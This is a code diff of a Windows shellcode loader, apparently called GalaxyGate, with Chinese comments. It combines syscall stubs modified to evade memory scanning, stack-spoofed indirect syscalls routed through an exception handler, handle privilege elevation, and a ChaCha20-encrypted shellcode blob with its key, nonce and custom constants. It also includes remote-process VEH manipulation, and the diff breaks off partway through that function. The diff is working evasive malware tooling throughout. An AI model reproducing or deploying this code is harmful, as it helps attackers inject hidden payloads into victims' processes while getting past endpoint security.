@@ -4,6 +4,8 @@
 #include <phnt_windows.h>
 #include <phnt.h>
 #include <stdbool.h>
+#include <wchar.h>
+#include <wctype.h>
 //#define DEBUG
 
 typedef struct _SFParams {
@@ -16,10 +18,11 @@ typedef struct _SFParams {
 DWORD* NullPointer = NULL;
 SFParams Params = { 0 }; // 用于向VEH传递真实的函数调用参数
 
-/*========================================
-以下代码属于GitHub项目 SysWhisper3 的部分引用
-https://github.com/klezVirus/SysWhispers3
-========================================*/
+
+/*===============================================
+  Syswhisper3的改造版本 移除内存缓存以对抗内存扫描
+===============================================*/
+
 DWORD SW3_HashSyscall(PCSTR FunctionName)
 {
 	DWORD i = 0;
@@ -109,7 +112,7 @@ PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
 	for (DWORD i = 0; i < NumberOfNames; i++)
 	{
 		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[i]);
-		if (*(USHORT*)FunctionName == 0x775a) // Check for "Zw"
+		if (*(USHORT*)FunctionName == 0x775a)
 		{
 			DWORD CurrentHash = SW3_HashSyscall(FunctionName);
 			if (CurrentHash == FunctionHash)
@@ -144,13 +147,13 @@ DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
 		DWORD Address;
 		DWORD Hash;
 	} SyscallEntry;
-	SyscallEntry TempEntries[600]; // 临时数组，假设最多 600 个 Zw* 函数
+	SyscallEntry TempEntries[600]; // 假设最多 600 个 Zw* 函数
 	DWORD Count = 0;
 
 	for (DWORD i = 0; i < NumberOfNames; i++)
 	{
 		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[i]);
-		if (*(USHORT*)FunctionName == 0x775a) // Check for "Zw"
+		if (*(USHORT*)FunctionName == 0x775a)
 		{
 			TempEntries[Count].Hash = SW3_HashSyscall(FunctionName);
 			TempEntries[Count].Address = Functions[Ordinals[i]];
@@ -183,9 +186,10 @@ DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
 	}
 	return -1;
 }
+
+
 /*========================================
-以上代码属于GitHub项目 SysWhisper3 的部分引用
-https://github.com/klezVirus/SysWhispers3
+  GalaxyGate 自研栈欺骗间接系统调用方案 :3
 ========================================*/
 
 LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
@@ -225,16 +229,18 @@ LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
 	return EXCEPTION_CONTINUE_SEARCH;
 }
 
-NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)RegionSize; Params.param[4] = (DWORD_PTR)NewProtect; Params.param[5] = (DWORD_PTR)OldProtect; Params.ParamNum = 5; Params.FuncHash = 0x097129F93; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
-NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)Buffer; Params.param[4] = (DWORD_PTR)NumberOfBytesToWrite; Params.param[5] = (DWORD_PTR)NumberOfBytesWritten; Params.ParamNum = 5; Params.FuncHash = 0x007901F0F; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
-NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)Buffer; Params.param[4] = (DWORD_PTR)BufferSize; Params.param[5] = (DWORD_PTR)NumberOfBytesRead; Params.ParamNum = 5; Params.FuncHash = 0x01D950B1B; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
-NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)ClientId; Params.ParamNum = 4; Params.FuncHash = 0x0FEA4D138; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
-NTSTATUS SFNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)ZeroBits; Params.param[4] = (DWORD_PTR)RegionSize; Params.param[5] = (DWORD_PTR)AllocationType; Params.param[6] = (DWORD_PTR)Protect; Params.ParamNum = 6; Params.FuncHash = 0x00114EF73; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
-NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)ProcessInformationClass; Params.param[3] = (DWORD_PTR)ProcessInformation; Params.param[4] = (DWORD_PTR)ProcessInformationLength; Params.param[5] = (DWORD_PTR)ReturnLength; Params.ParamNum = 5; Params.FuncHash = 0x0DD27CE88; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
-NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options) { Params.param[1] = (DWORD_PTR)SourceProcessHandle; Params.param[2] = (DWORD_PTR)SourceHandle; Params.param[3] = (DWORD_PTR)TargetProcessHandle; Params.param[4] = (DWORD_PTR)TargetHandle; Params.param[5] = (DWORD_PTR)DesiredAccess; Params.param[6] = (DWORD_PTR)HandleAttributes; Params.param[7] = (DWORD_PTR)Options; Params.ParamNum = 7; Params.FuncHash = 0x0ECBFE423; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
-NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)SystemInformationClass; Params.param[2] = (DWORD_PTR)SystemInformation; Params.param[3] = (DWORD_PTR)SystemInformationLength; Params.param[4] = (DWORD_PTR)ReturnLength; Params.ParamNum = 4; Params.FuncHash = 0x09E349EA7; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
+NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)RegionSize; Params.param[4] = (DWORD_PTR)NewProtect; Params.param[5] = (DWORD_PTR)OldProtect; Params.ParamNum = 5; Params.FuncHash = 0x097129F93; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
+NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)Buffer; Params.param[4] = (DWORD_PTR)NumberOfBytesToWrite; Params.param[5] = (DWORD_PTR)NumberOfBytesWritten; Params.ParamNum = 5; Params.FuncHash = 0x007901F0F; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
+NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)Buffer; Params.param[4] = (DWORD_PTR)BufferSize; Params.param[5] = (DWORD_PTR)NumberOfBytesRead; Params.ParamNum = 5; Params.FuncHash = 0x01D950B1B; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
+NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)ClientId; Params.ParamNum = 4; Params.FuncHash = 0x0FEA4D138; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
+NTSTATUS SFNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)ZeroBits; Params.param[4] = (DWORD_PTR)RegionSize; Params.param[5] = (DWORD_PTR)AllocationType; Params.param[6] = (DWORD_PTR)Protect; Params.ParamNum = 6; Params.FuncHash = 0x00114EF73; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
+NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)ProcessInformationClass; Params.param[3] = (DWORD_PTR)ProcessInformation; Params.param[4] = (DWORD_PTR)ProcessInformationLength; Params.param[5] = (DWORD_PTR)ReturnLength; Params.ParamNum = 5; Params.FuncHash = 0x0DD27CE88; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
+NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options) { Params.param[1] = (DWORD_PTR)SourceProcessHandle; Params.param[2] = (DWORD_PTR)SourceHandle; Params.param[3] = (DWORD_PTR)TargetProcessHandle; Params.param[4] = (DWORD_PTR)TargetHandle; Params.param[5] = (DWORD_PTR)DesiredAccess; Params.param[6] = (DWORD_PTR)HandleAttributes; Params.param[7] = (DWORD_PTR)Options; Params.ParamNum = 7; Params.FuncHash = 0x0ECBFE423; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
+NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)SystemInformationClass; Params.param[2] = (DWORD_PTR)SystemInformation; Params.param[3] = (DWORD_PTR)SystemInformationLength; Params.param[4] = (DWORD_PTR)ReturnLength; Params.ParamNum = 4; Params.FuncHash = 0x09E349EA7; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
+NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)MemoryInformationClass; Params.param[4] = (DWORD_PTR)MemoryInformation; Params.param[5] = (DWORD_PTR)MemoryInformationLength; Params.param[6] = (DWORD_PTR)ReturnLength; Params.ParamNum = 6; Params.FuncHash = 0x003910903; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
 
-DWORD ConvertProcNameToPid(wchar_t* ProcName) { // 根据进程名获取进程ID
+
+DWORD ConvertProcNameToPid(wchar_t* ProcName) { // 进程名转换PID
 	ULONG bufferSize = 1024 * 1024;
 	PVOID buffer = malloc(bufferSize);
 	ULONG returnLength = 0;
@@ -255,34 +261,35 @@ DWORD ConvertProcNameToPid(wchar_t* ProcName) { // 根据进程名获取进程ID
 	return 0;
 }
 
-// 感谢CodeWhiteSec对句柄提权的研究 代码改编自https://github.com/codewhitesec/SysmonEnte/
+// 感谢CodeWhiteSec对句柄提权的研究 代码改自https://github.com/codewhitesec/SysmonEnte/
 HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD HandleAttributes) { // 句柄提升漏洞
 	HANDLE hDupPriv = NULL;
 	HANDLE hHighPriv = NULL;
 	ULONG options = 0;
 	#ifdef DEBUG
-	printf("[*] 利用句柄提升漏洞... 进度(1/2)\n");
+	printf("[*] 正在利用句柄提权漏洞...(进度1/2)\n");
 	#endif
 	SFNtDuplicateObject((HANDLE)(LONG_PTR)-1, hProcess, (HANDLE)(LONG_PTR)-1, &hDupPriv, PROCESS_DUP_HANDLE, FALSE, 0);
-	#ifdef DEBUG
-	printf("[*] 利用句柄提升漏洞... 进度(2/2)\n");
-	#endif
 	SFNtDuplicateObject(hDupPriv, (HANDLE)(LONG_PTR)-1, (HANDLE)(LONG_PTR)-1, &hHighPriv, DesiredAccess, HandleAttributes, options);
+	#ifdef DEBUG
+	printf("[*] 正在利用句柄提权漏洞...(进度2/2)\n");
+	#endif
 	return hHighPriv;
 }
 
+
+// .\ShellcodeEncryptor\Chacha20.py生成的非标准ChaCha20加密shellcode
 unsigned char encrypted_shellcode[] = {
-	0x76, 0xA1, 0xD7, 0x3A, 0xCE, 0x3E, 0x59, 0x33, 0xB1, 0x46, 0xD9, 0xDC, 0x37, 0x11, 0xB9, 0x96, 0x80, 0x6A, 0xBE, 0xB5, 0x93, 0x34, 0x31, 0xA2, 0x5A, 0xBB, 0x41, 0x7B, 0x0D, 0x68, 0x85, 0xD1, 0x0C, 0x28, 0x20, 0x10, 0xF5, 0xFA, 0x13, 0xCA, 0xF1, 0x2D, 0xAD, 0x32, 0x63, 0x8E, 0x45, 0x08, 0x61, 0xEB, 0xE0, 0xC6, 0xFB, 0x11, 0x59, 0x52, 0x58, 0xB9, 0x29, 0x66, 0xD9, 0x6F, 0x91, 0x0E, 0x5B, 0xE8, 0x52, 0xEB, 0x15, 0x68, 0xCA, 0xDE, 0xD5, 0xF1, 0xB6, 0x07, 0xBB, 0x0B, 0x0F, 0xBF, 0x65, 0x7F, 0x25, 0x7F, 0x02, 0x61, 0xBC, 0x47, 0xD4, 0x4E, 0x27, 0xAB, 0x5B, 0xB6, 0x87, 0x01, 0x26, 0x6E, 0x2F, 0x11, 0x10, 0x2E, 0xA3, 0xDD, 0xD6, 0xDA, 0xA3, 0x96, 0xCD, 0x17, 0xD1, 0x07, 0x42, 0xDA, 0xAD, 0xDB, 0xEF, 0x91, 0x56, 0xCD, 0x79, 0x5E, 0x07, 0x57, 0xC5, 0xEE, 0xCA, 0xA2, 0x9A, 0x81, 0x4A, 0xBB, 0x10, 0xB8, 0xEE, 0x3B, 0xBC, 0x75, 0x97, 0xB1, 0x2E, 0x84, 0x0E, 0x22, 0xCA, 0xED, 0xD2, 0x6B, 0xB0, 0xE9, 0xAA, 0x2A, 0x90, 0xC8, 0xFB, 0x4D, 0x62, 0x62, 0xC6, 0xF4, 0xD3, 0xC0, 0x2C, 0x96, 0x48, 0x04, 0x6B, 0x65, 0xB0, 0xB4, 0x1D, 0xE5, 0x35, 0x6E, 0x93, 0x54, 0x71, 0x83, 0x5C, 0xCC, 0xF9, 0x87, 0xC3, 0xA6, 0x00, 0x6E, 0x53, 0x0C, 0x3A, 0x7A, 0x07, 0x3A, 0xA0, 0x7C, 0xCF, 0x45, 0x27, 0xE2, 0x0D, 0x79, 0x90, 0xD1, 0xE8, 0x48, 0x85, 0x29, 0x28, 0xEC, 0x7B, 0xF4, 0x4C, 0x22, 0x1F, 0xBE, 0x00, 0x3A, 0x16, 0xF2, 0xC7, 0x75, 0xFC, 0xC8, 0x40, 0x11, 0x96, 0x2F, 0xA9, 0x73, 0x2C, 0xFB, 0xE2, 0x7C, 0xD4, 0x12, 0xB1, 0xDC, 0x69, 0x92, 0x0D, 0x4A, 0x1F, 0x25, 0x65, 0xD9, 0x74, 0x38, 0x52, 0xC6, 0xAF, 0xE0, 0x12, 0x7F, 0xDB, 0xAB, 0xE5, 0x1C, 0xDD, 0xB8, 0x65, 0xB7, 0x84, 0xB6, 0x07, 0xF6, 0x88, 0xEC, 0x61, 0x64, 0xEF, 0x77, 0xB6, 0x6E, 0x70, 0xCD, 0x65, 0x7F, 0x2D, 0x99, 0x8D, 0xDF, 0x8B, 0xC5, 0x89, 0x09, 0xB8, 0x34, 0x7D, 0x2E, 0xD0, 0x12, 0xCF, 0x56, 0x2E, 0xD3, 0x0F, 0x6D, 0xCE, 0x70, 0xD4, 0x0D, 0x82, 0x2B, 0x5C, 0x7F, 0x82, 0xEF, 0x71, 0xDC, 0xFA, 0xEE, 0x24, 0x5F, 0x14, 0x8D, 0x4D, 0x5B, 0x69, 0x23, 0x69, 0xA3, 0xEB, 0x21, 0xE1, 0xC8, 0x05, 0x58, 0x11, 0x7E, 0xDE, 0x39, 0xF8, 0x3B, 0x19, 0x99, 0xF7, 0x33, 0xF5, 0xBB, 0x4D, 0x33, 0x0C, 0x27, 0x12, 0x05, 0x0C, 0x02, 0xB5, 0x29, 0x16, 0x57, 0x66, 0x19, 0x99, 0x21, 0x2A, 0x68, 0xC1, 0xE8, 0xA2, 0xEB, 0x7A, 0xE8, 0x14, 0xE9, 0x5F, 0xB9, 0xDF, 0x18, 0xFF, 0xA6, 0x45, 0x87, 0x19, 0x31, 0x22
+	0xC1, 0x4B, 0xC4, 0xFA, 0xBF, 0xE9, 0x0E, 0xB3, 0xEF, 0xCE, 0x60, 0x92, 0x7E, 0xE0, 0x7E, 0x6D, 0xC1, 0x52, 0xC7, 0xB0, 0xC4, 0xF6, 0x17, 0x4A, 0xEE, 0xBD, 0x94, 0x54, 0x89, 0xF3, 0xED, 0x89, 0x51, 0xD9, 0x7D, 0x44, 0x77, 0x3E, 0x89, 0xC3, 0x3F, 0xF0, 0x35, 0xE2, 0x1C, 0x4E, 0xE6, 0x8E, 0x4F, 0xFF, 0x4E, 0x33, 0xE6, 0x57, 0xCB, 0x13, 0x76, 0xA3, 0x87, 0x73, 0x11, 0x18, 0xCB, 0x9B, 0x49, 0x23, 0x06, 0xB8, 0xBB, 0xFF, 0xBB, 0x31, 0x22, 0x70, 0x23, 0x09, 0x3B, 0x9A, 0xE0, 0x97, 0xE1, 0xD3, 0xA2, 0x36, 0xE4, 0x7E, 0x1F, 0xAD, 0xFB, 0x66, 0x70, 0x63, 0x0A, 0x7C, 0x56, 0x87, 0xDE, 0xD2, 0x1D, 0x85, 0x31, 0xD9, 0xA5, 0x29, 0xFA, 0x52, 0xBA, 0xDE, 0x25, 0x94, 0x61, 0x9E, 0x61, 0x01, 0xE5, 0x78, 0x46, 0x46, 0x07, 0x05, 0x01, 0xB3, 0x1B, 0xCB, 0xDC, 0x57, 0x47, 0x7B, 0x22, 0xB7, 0x17, 0xA0, 0x4F, 0x98, 0xA6, 0x19, 0xCA, 0x26, 0x12, 0x81, 0x35, 0xF2, 0xB2, 0xAE, 0x85, 0x7B, 0xCA, 0xDF, 0x41, 0xB5, 0x07, 0x14, 0x5E, 0x87, 0x88, 0x20, 0x81, 0xD0, 0x5A, 0xDE, 0x52, 0x4F, 0x1C, 0x2D, 0x0B, 0xD0, 0xA1, 0xC7, 0x2D, 0xF1, 0x02, 0xA1, 0x56, 0xBF, 0x8A, 0x0E, 0xB9, 0x87, 0x11, 0xFF, 0x81, 0xF4, 0xC3, 0xE7, 0xA9, 0x2C, 0xAA, 0x02, 0x19, 0xD5, 0xE1, 0x7E, 0x4E, 0x43, 0x7D, 0x56, 0x6C, 0xE9, 0x74, 0xF2, 0xAE, 0xC5, 0xF1, 0x10, 0xF7, 0x38, 0xFE, 0x89, 0xB1, 0xA7, 0x26, 0x73, 0x5E, 0x89, 0x5E, 0x00, 0x11, 0x90, 0x77, 0x38, 0x12, 0xE7, 0x0E, 0xD2, 0x4A, 0x83, 0x24, 0xD8, 0xB1, 0x90, 0x48, 0xEE, 0xF5, 0xF0, 0x54, 0xAC, 0x99, 0x86, 0xA9, 0xF7, 0xD0, 0x70, 0x50, 0x5C, 0xD4, 0x20, 0x8B, 0x80, 0x2C, 0x77, 0x30, 0x16, 0x86, 0xC1, 0x49, 0x33, 0x16, 0xA7, 0x7A, 0x67, 0x69, 0xA5, 0x98, 0x9B, 0x1E, 0x6B, 0x65, 0x14, 0xD6, 0xBC, 0x40, 0x72, 0x45, 0x95, 0xA8, 0x7F, 0x64, 0xE6, 0x7B, 0x79, 0xBD, 0xA5, 0xCE, 0x67, 0xC9, 0xD8, 0x4C, 0xDE, 0x57, 0x5C, 0xEF, 0xAE, 0x50, 0x5A, 0xCA, 0xEA, 0x8D, 0x16, 0x6D, 0xC7, 0x00, 0xE1, 0xD7, 0x03, 0x3F, 0xAD, 0xB1, 0xB1, 0x7F, 0x47, 0xC9, 0x8F, 0xD5, 0x5A, 0x81, 0x90, 0xAB, 0x51, 0x83, 0xD2, 0x68, 0x37, 0x90, 0xE1, 0x78, 0xBD, 0x0C, 0xA6, 0x4C, 0xBB, 0x93, 0xEF, 0xB6, 0xC8, 0x6E, 0x81, 0x0F, 0x5B, 0x8D, 0x1D, 0x8B, 0x89, 0x6D, 0x9B, 0xC9, 0xB8, 0xF2, 0x25, 0xD1, 0x95, 0x0E, 0xA4, 0x32, 0xDD, 0xA0, 0xCD, 0x64, 0x6A, 0x41, 0x20, 0x69, 0xC1, 0x69, 0x20, 0x08, 0x4E, 0xCE, 0xDD, 0xA3, 0x52, 0x97, 0x1B, 0xCF, 0x8D, 0x41
 };
 
 // 密钥和 nonce：
-unsigned char key[] = { 0x80, 0x23, 0x03, 0xB7, 0xE8, 0x9A, 0x57, 0x54, 0x51, 0x16, 0x79, 0x40, 0x79, 0x71, 0xD5, 0x7E, 0xB4, 0x37, 0x7A, 0x0B, 0xB2, 0x28, 0x8A, 0xE3, 0xB1, 0x26, 0x87, 0xBC, 0x30, 0x34, 0x38, 0xC5 };
-unsigned char nonce[] = { 0x94, 0xF2, 0x98, 0xF8, 0xB2, 0x72, 0xD4, 0x88, 0xA6, 0x2D, 0xA1, 0x1F, 0x0D, 0x7E, 0x06, 0xCE };
+unsigned char key[] = { 0xB2, 0x13, 0x11, 0x0D, 0x8C, 0x82, 0xEE, 0x12, 0x09, 0x6F, 0x9A, 0x82, 0xEF, 0x87, 0x02, 0xDF, 0x49, 0x10, 0xD7, 0x04, 0x3B, 0x7D, 0x4A, 0xB6, 0x28, 0x33, 0xFE, 0x1F, 0xC0, 0x8B, 0x08, 0x54 };
+unsigned char nonce[] = { 0x74, 0x89, 0x70, 0x3A, 0x2C, 0xD3, 0xE4, 0x3B, 0x9F, 0x1D, 0x52, 0xA9, 0xD8, 0x66, 0x83, 0x08 };
+
 
 // 左旋转宏
 #define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
-// 对齐宏（向上取整到对齐边界）
-#define ALIGN_UP(x, a) (((x) + ((a) - 1)) & ~((a) - 1))
 // 对齐宏（向上取整到对齐边界）
 #define ALIGN_UP(x, a) (((x) + ((a) - 1)) & ~((a) - 1))
 
@@ -323,16 +330,16 @@ void chacha20_block(uint32_t* state, uint8_t* keystream) {
 void chacha20_decrypt(const unsigned char* encrypted, size_t len,
 	const unsigned char* key, const unsigned char* nonce,
 	unsigned char* decrypted) {
-	// Initialize ChaCha20 state
+	// 初始化 ChaCha20 状态
 	uint32_t state[16];
 
-	// Constants
-	state[0] = 0x61707865; // "expa"
-	state[1] = 0x3320646e; // "nd 3"
-	state[2] = 0x79622d32; // "2-by"
-	state[3] = 0x6b206574; // "te k"
+	// 自定义常量（需与加密器一致）
+	state[0] = 0x72617453; // "Star"
+	state[1] = 0x20796C46; // "Fly "
+	state[2] = 0x6A6F7250; // "Proj"
+	state[3] = 0x21746365; // "ect!"
 
-	// Key (32 bytes)
+	// 密钥（32 字节）
 	for (int i = 0; i < 8; i++) {
 		state[4 + i] = ((uint32_t)key[4 * i]) |
 			((uint32_t)key[4 * i + 1] << 8) |
@@ -340,7 +347,7 @@ void chacha20_decrypt(const unsigned char* encrypted, size_t len,
 			((uint32_t)key[4 * i + 3] << 24);
 	}
 
-	// Nonce (nonce[4:16] -> state[13-15])
+	// 随机数（nonce[4:16] -> state[13-15]）
 	state[13] = ((uint32_t)nonce[4]) | ((uint32_t)nonce[5] << 8) |
 		((uint32_t)nonce[6]) << 16 | ((uint32_t)nonce[7] << 24);
 	state[14] = ((uint32_t)nonce[8]) | ((uint32_t)nonce[9] << 8) |
@@ -348,15 +355,15 @@ void chacha20_decrypt(const unsigned char* encrypted, size_t len,
 	state[15] = ((uint32_t)nonce[12]) | ((uint32_t)nonce[13] << 8) |
 		((uint32_t)nonce[14]) << 16 | ((uint32_t)nonce[15] << 24);
 
-	// Initial counter (nonce[0:4])
+	// 初始计数器（nonce[0:4]）
 	uint32_t initial_counter = ((uint32_t)nonce[0]) | ((uint32_t)nonce[1] << 8) |
 		((uint32_t)nonce[2] << 16) | ((uint32_t)nonce[3] << 24);
 
 	uint8_t keystream[64];
-	size_t num_blocks = (len + 63) / 64; // Number of 64-byte blocks
+	size_t num_blocks = (len + 63) / 64; // 64字节块的数量
 
 	for (size_t block = 0; block < num_blocks; block++) {
-		state[12] = initial_counter + block; // Counter increments per block
+		state[12] = initial_counter + block; // 每个块计数器自增
 		chacha20_block(state, keystream);
 
 		size_t start = block * 64;
@@ -379,9 +386,63 @@ unsigned char* shellcode_decrypt(unsigned char* encrypted, size_t len) {
 	return decrypted;
 }
 
+PVOID GetLocalKernel32EntryPoint()
+{
+	PROCESS_BASIC_INFORMATION pbi = { 0 };
+	ULONG retLen = 0;
+	SFNtQueryInformationProcess((HANDLE)(LONG_PTR)-1, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
+
+	PPEB peb = (PPEB)pbi.PebBaseAddress;
+	if (!peb || !peb->Ldr)
+		return NULL;
+
+	PPEB_LDR_DATA ldr = peb->Ldr;
+	PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
+	PLIST_ENTRY node = head->Flink;
+
+	static const WCHAR target[] = L"kernel32.dll";
+	size_t targetLen = (sizeof(target) / sizeof(target[0])) - 1; // 不含终止符
+
+	while (node != head)
+	{
+		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(node, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+		UNICODE_STRING *baseName = &entry->BaseDllName;
+		if (baseName->Buffer && baseName->Length)
+		{
+			USHORT nameLen = baseName->Length / (USHORT)sizeof(WCHAR);
+			if ((size_t)nameLen == targetLen)
+			{
+				BOOLEAN equal = TRUE;
+				for (size_t i = 0; i < targetLen; ++i)
+				{
+					WCHAR a = towlower(baseName->Buffer[i]);
+					WCHAR b = towlower(target[i]);
+					if (a != b) { equal = FALSE; break; }
+				}
+				if (equal)
+				{
+					PBYTE imageBase = (PBYTE)entry->DllBase;
+					PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
+					if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+						return NULL;
+					PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(imageBase + dos->e_lfanew);
+					if (nt->Signature != IMAGE_NT_SIGNATURE)
+						return NULL;
+					DWORD rva = nt->OptionalHeader.AddressOfEntryPoint;
+					return (PVOID)(imageBase + rva);
+				}
+			}
+		}
+		node = node->Flink;
+	}
+
+	return NULL;
+}
+
+
 BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize);
 PVOID findLdrpVectorHandlerList(PVOID VEH);
-LPVOID EnableRemoteVEH(HANDLE hProcess);
+void EnableRemoteVEH(HANDLE hProcess);
 
 #define InitializeObjectAttributes(p, n, a, r, s) \
 { \
@@ -605,26 +666,22 @@ PVOID findLdrpVectorHandlerList(PVOID VEH)
 }
 
 //Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the remote process PEB
-//Returns the ImageBaseAddress if successful
-LPVOID EnableRemoteVEH(HANDLE hProcess) {
+void EnableRemoteVEH(HANDLE hProcess) {
+	#ifdef DEBUG
+	printf("[*] 正在启用目标进程VEH...\n");
+	#endif
 	PROCESS_BASIC_INFORMATION processInfo = { 0 };
 	ULONG returnLength = 0;
